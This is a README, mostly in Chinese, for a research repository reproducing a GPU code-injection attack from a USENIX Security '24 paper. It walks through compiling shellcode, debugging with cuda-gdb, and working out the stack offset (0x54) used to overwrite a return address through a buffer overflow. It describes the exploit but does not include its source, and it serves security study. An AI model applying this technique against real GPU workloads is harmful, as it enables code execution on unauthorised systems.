# GPU Code Injection Reproduction

> **Paper:** GPU Memory Exploitation for Fun and Profit (USENIX Security '24)  
> **Goal:** 复现论文中的 Code Injection（代码注入）攻击，验证现代 GPU 缺乏数据执行保护（DEP/NX），证明数据段内存（Global/Local Memory）可被作为指令执行。
> **Goal:** llmAttack文件夹也是PoC，我没写readme.md，复现价值不大

## 🛠️ 前置准备 (Prerequisites)

*   **Hardware:** NVIDIA GPU (本例中使用 Ampere 架构 `sm_86`，如 RTX 30 系列)
*   **Software:** CUDA Toolkit, Linux Environment

---

## 🚀 快速开始 (Usage)

### 1. 构造 Shellcode (Preparation)
首先需要编写并提取用于注入的 GPU 机器码（SASS）。

**1.1 编译为 CUDA Binary (`.cubin`)**
```bash
# 注意：-arch=sm_XX 需根据你的显卡型号调整
nvcc -arch=sm_86 -cubin shellcode_gen.cu
```

**1.2 提取机器码 (SASS)**
使用 `cuobjdump` 反汇编查看生成的汇编指令，提取十六进制机器码。
```bash
cuobjdump -sass shellcode_gen.cubin
```

### 2. 实施攻击 (Exploitation)
攻击逻辑：将提取的 Shellcode 放置在 `input_data` 的起始位置，利用缓冲区溢出覆盖栈上的返回地址，将其指向 `input_data` 的地址。

**2.1 编译攻击代码**
*注意：必须关闭优化 (`-O0`) 并保留调试信息 (`-g -G`) 以防止编译器优化掉局部数组或改变栈结构。*
```bash
nvcc -O0 -g -G -arch=sm_86 exploit.cu -o exploit
```

**2.2 运行 Exploit**
```bash
./exploit
```

### 3. 验证结果 (Verification)
如果攻击成功，GPU 将执行注入的 Shellcode 并正常退出，你将看到如下输出：
```text
[!!!] PWNED! Kernel finished successfully.
```

---

## 🔍 技术细节与调试 (Technical Deep Dive)

本节记录了如何通过逆向工程找到关键的 Stack Offset（栈偏移量）。

### 调试工具
使用 `cuda-gdb` 对受害者程序进行动态调试：

```bash
cuda-gdb ./victim
(cuda-gdb) break vulnerable_function
(cuda-gdb) run
(cuda-gdb) disas
```

### 汇编分析 (SASS Analysis)

通过分析汇编代码，我们确定了栈的大小以及返回地址的存储位置。

#### 1. 栈空间分配 (Stack Allocation)
函数入口处，栈指针 `R1` 减去 `0x60`，说明栈帧大小为 96 字节。
```asm
<+0>:    IADD3 R1, R1, -0x60, RZ   ; Stack Pointer (R1) -= 96 bytes
```

#### 2. 返回地址存储 (Register Spilling)
编译器将返回地址寄存器 (`R20`, `R21`) 保存到了栈的深处。
```asm
; 保存返回地址 (Prologue)
<+96>:   STL [R1+0x54], R20        ; Return Addr Low (32-bit) -> Offset 0x54
<+80>:   STL [R1+0x58], R21        ; Return Addr High (32-bit) -> Offset 0x58
```

#### 3. 返回地址恢复 (Function Epilogue)
函数返回前，从该位置恢复地址。
```asm
; 恢复返回地址 (Epilogue)
<+1904>: LDL R20, [R1+0x54]        ; Restore Return Addr Low from Offset 0x54
```

### 栈布局可视化 (Stack Layout)

根据调试结果，GPU Local Memory (Stack) 的布局如下所示：

```text
      低地址 (Low Address)  <--- 当前 R1 (Stack Pointer) 指向此处
      |
      v
+-----------------------+ <--- Offset 0x00
| local_buffer[0]       | \
| local_buffer[1]       |  |
| ...                   |  |  [攻击区域] Payload / Shellcode
| ...                   |  |  (共 16 个 int = 64 字节)
| local_buffer[15]      | /
+-----------------------+ <--- Offset 0x40 (64 bytes)
| Saved R2              | \
| Saved R16             |  |
| Saved R17             |  |  [被覆盖区域] 保存的寄存器
| Saved R18             |  |  (Saved Registers)
| Saved R19             | /
+-----------------------+ <--- Offset 0x54 (84 bytes) 【TARGET】
| Return Addr (Low 32)  | ===> 对应 payload[21] (覆盖为 R20)
+-----------------------+ <--- Offset 0x58 (88 bytes)
| Return Addr (High 32) | ===> 对应 payload[22] (覆盖为 R21)
+-----------------------+ <--- Offset 0x5C (92 bytes)
| (Alignment/Padding)   |
+-----------------------+ <--- Offset 0x60 (96 bytes)
      ^
      |
      高地址 (High Address) <--- 函数调用前的旧 R1
```

### Payload 计算

*   **Target Offset:** `0x54` (84 bytes)
*   **Buffer Start:** `0x00`
*   **Padding Size:** 84 bytes / 4 bytes(int) = **21 ints**

因此，我们需要填充 21 个整数，并在第 22 个 (`index 21`) 和第 23 个 (`index 22`) 整数处写入我们的跳转目标地址。

---

## ⚠️ 免责声明 (Disclaimer)
*本仓库代码仅用于安全研究与教育目的。请勿在未经授权的系统上进行测试。*